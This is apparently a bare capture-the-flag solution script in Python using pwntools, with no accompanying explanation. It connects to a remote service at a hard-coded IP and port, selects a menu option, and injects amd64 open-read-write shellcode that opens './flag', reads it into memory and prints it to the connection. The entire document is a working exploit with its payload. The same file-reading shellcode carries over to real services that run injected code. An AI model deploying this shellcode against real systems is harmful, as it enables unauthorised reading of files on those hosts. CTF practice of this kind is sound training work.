from pwn import *

#io=process('shellcode2')
io=remote("219.216.65.41",36614)
context.terminal = ['tmux', 'splitw', '-h']
context(log_level='debug',arch='amd64',os='linux')

#gdb.attach(io)

io.recv()
io.sendline(str(3).encode())
shellcode2='''
mov rax, 0x67616c662f2e 
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x2
syscall
'''
shellcode2+='''
mov rdi, 0x3
mov rsi, 0x404100
mov rdx, 0x30
mov rax, 0
syscall
'''
shellcode2+='''
mov rdi, 0x1
mov rsi, 0x404100
mov rdx, 0x30
mov rax, 0x1
syscall
'''
io.recv()
#gdb.attach(io)
io.send(asm(shellcode2))


io.interactive()
